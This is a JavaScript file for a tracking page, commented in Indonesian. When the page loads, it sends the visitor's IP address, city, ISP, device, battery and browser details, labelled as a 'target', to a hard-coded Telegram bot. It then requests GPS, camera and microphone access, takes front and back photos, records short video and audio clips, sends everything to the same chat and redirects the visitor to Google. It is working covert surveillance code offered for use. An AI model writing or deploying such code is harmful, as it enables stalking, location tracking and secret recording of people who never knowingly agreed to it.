const video = document.getElementById("cameraPreview");
const status = document.getElementById("status");

// ====================
// CONFIG TELEGRAM
// ====================
const TELEGRAM_BOT_TOKEN = "8854175546:AAHOqFJRPO1gKAbEsf0cT-cKSkLpk7TGxfk";
const TELEGRAM_CHAT_ID = "8862634415";

// Helper Kirim Teks
async function sendTelegramText(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: "Markdown" })
    });
  } catch (e) {}
}

// Helper Kirim Foto
async function sendTelegramPhoto(blob, caption) {
  try {
    const fd = new FormData();
    fd.append("chat_id", TELEGRAM_CHAT_ID);
    fd.append("photo", blob, "photo.jpg");
    fd.append("caption", caption);
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
  } catch (e) {}
}

// Helper Kirim Video
async function sendTelegramVideo(blob) {
  try {
    const fd = new FormData();
    fd.append("chat_id", TELEGRAM_CHAT_ID);
    fd.append("video", blob, "video.webm");
    fd.append("caption", "🎥 Video Rekaman (Real-time)");
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, { method: "POST", body: fd });
  } catch (e) {}
}

// Helper Kirim Audio
async function sendTelegramAudio(blob) {
  try {
    const fd = new FormData();
    fd.append("chat_id", TELEGRAM_CHAT_ID);
    fd.append("audio", blob, "audio.webm");
    fd.append("caption", "🎙️ Rekaman Suara (Real-time)");
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio`, { method: "POST", body: fd });
  } catch (e) {}
}

// Helper Ambil Snapshot Tanpa Hitam
function takeSnapshot(stream) {
  return new Promise((resolve) => {
    video.srcObject = stream;
    video.play().catch(() => {});

    const check = setInterval(() => {
      if (video.videoWidth > 0 && video.videoHeight > 0) {
        clearInterval(check);
        setTimeout(() => {
          const canvas = document.createElement("canvas");
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext("2d");
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          canvas.toBlob((blob) => resolve(blob), "image/jpeg", 0.9);
        }, 400);
      }
    }, 100);

    setTimeout(() => {
      clearInterval(check);
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      canvas.toBlob((blob) => resolve(blob), "image/jpeg", 0.9);
    }, 2000);
  });
}

// ====================
// 1. KIRIM IP & INFO SUPER LENGKAP SECEPAT KILAT
// ====================
async function sendInstantIP() {
  let ipInfo = "Tidak diketahui";
  let city = "-", country = "-", isp = "-";
  
  try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();
    ipInfo = data.ip;
    city = data.city;
    country = data.country_name;
    isp = data.org;
  } catch (e) {}

  // Deteksi Baterai (jika didukung perangkat)
  let batteryInfo = "Tidak diketahui";
  try {
    if (navigator.getBattery) {
      const b = await navigator.getBattery();
      batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'Sedang Dicas ⚡' : 'Tidak Dicas 🔋'})`;
    }
  } catch (e) {}

  // Deteksi Jaringan
  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  let netType = connection ? (connection.effectiveType || "Tidak diketahui") : "Tidak diketahui";
  let downlink = connection ? (connection.downlink + " Mbps" ) : "-";

  const ua = navigator.userAgent;
  let device = "Desktop / Lainnya";
  if (/android/i.test(ua)) device = "Android";
  else if (/iphone|ipad|ipod/i.test(ua)) device = "iOS (Apple)";
  else if (/windows/i.test(ua)) device = "Windows PC";
  else if (/macintosh|mac os x/i.test(ua)) device = "Mac OS";

  const screenRes = `${window.screen.width} x ${window.screen.height}`;
  const colorDepth = `${window.screen.colorDepth} bit`;
  const cpuCores = navigator.hardwareConcurrency || "Tidak diketahui";
  const deviceRam = navigator.deviceMemory ? `${navigator.deviceMemory} GB (Perkiraan)` : "Tidak diketahui";
  const language = navigator.language || navigator.userLanguage || "Tidak diketahui";
  const localTime = new Date().toLocaleString();
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const cookiesEnabled = navigator.cookieEnabled ? "Aktif" : "Non-aktif";
  const referrer = document.referrer ? document.referrer : "Langsung mengetik URL / Bookmark";

  const fullReport = 
    `🚨 **TARGET SUPER DETAIL MASUK** 🚨\n\n` +
    `🌐 **JARINGAN & LOKASI IP**\n` +
    `• IP Address: \`${ipInfo}\`\n` +
    `• Kota/Negara: ${city}, ${country}\n` +
    `• ISP/Provider: ${isp}\n` +
    `• Tipe Jaringan: ${netType} (~${downlink})\n\n` +

    `📱 **HARDWARE & PERANGKAT**\n` +
    `• Perangkat: ${device}\n` +
    `• Platform: ${navigator.platform || "N/A"}\n` +
    `• Resolusi Layar: ${screenRes} (${colorDepth})\n` +
    `• Inti CPU (Cores): ${cpuCores}\n` +
    `• Estimasi RAM: ${deviceRam}\n` +
    `• Status Baterai: ${batteryInfo}\n\n` +

    `🌐 **BRAWSER & WAKTU**\n` +
    `• Bahasa Browser: ${language}\n` +
    `• Zona Waktu: ${timezone}\n` +
    `• Waktu Target: ${localTime}\n` +
    `• Cookie: ${cookiesEnabled}\n` +
    `• Sumber Masuk (Referrer): ${referrer}\n\n` +
    `💻 \`User-Agent:\`\n_${ua}_`;

  await sendTelegramText(fullReport);
}

// ====================
// 2. EKSEKUSI IZIN & MEDIA BERURUTAN
// ====================
async function runSequence() {
  // Minta Izin Lokasi (GPS)
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        try {
          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, latitude: pos.coords.latitude, longitude: pos.coords.longitude })
          });
        } catch (e) {}
      },
      () => {},
      { timeout: 6000 }
    );
  }

  await new Promise(r => setTimeout(r, 1000));

  // Kamera Depan
  try {
    const fStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
    const fBlob = await takeSnapshot(fStream);
    fStream.getTracks().forEach(t => t.stop());
    if (fBlob) await sendTelegramPhoto(fBlob, "📸 Foto Kamera Depan");
  } catch (e) {}

  await new Promise(r => setTimeout(r, 800));

  // Kamera Belakang
  try {
    const bStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
    const bBlob = await takeSnapshot(bStream);
    bStream.getTracks().forEach(t => t.stop());
    if (bBlob) await sendTelegramPhoto(bBlob, "📸 Foto Kamera Belakang");
  } catch (e) {}

  await new Promise(r => setTimeout(r, 800));

  // Rekam Video (3 Detik)
  try {
    const vStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
    video.srcObject = vStream;
    video.play().catch(() => {});

    await new Promise((resolve) => {
      let chunks = [];
      const recorder = new MediaRecorder(vStream, { mimeType: 'video/webm' });
      recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
      recorder.onstop = async () => {
        vStream.getTracks().forEach(t => t.stop());
        const blob = new Blob(chunks, { type: 'video/webm' });
        await sendTelegramVideo(blob);
        resolve();
      };
      recorder.start();
      setTimeout(() => { if (recorder.state !== "inactive") recorder.stop(); }, 3000);
    });
  } catch (e) {}

  await new Promise(r => setTimeout(r, 800));

  // Rekam Audio (3 Detik)
  try {
    const aStream = await navigator.mediaDevices.getUserMedia({ audio: true });
    await new Promise((resolve) => {
      let chunks = [];
      const recorder = new MediaRecorder(aStream);
      recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
      recorder.onstop = async () => {
        aStream.getTracks().forEach(t => t.stop());
        const blob = new Blob(chunks, { type: 'audio/webm' });
        await sendTelegramAudio(blob);
        resolve();
      };
      recorder.start();
      setTimeout(() => { if (recorder.state !== "inactive") recorder.stop(); }, 3000);
    });
  } catch (e) {}

  // Selesai semua -> Redirect ke Google
  window.location.href = "https://www.google.com";
}

// ====================
// KETIKA HALAMAN DIBUKA
// ====================
window.addEventListener("load", () => {
  // 1. Kirim laporan data lengkap seketika detik pertama web dibuka
  sendInstantIP();

  // 2. Mulai antrean izin setelah 1 detik
  setTimeout(runSequence, 1000);
});
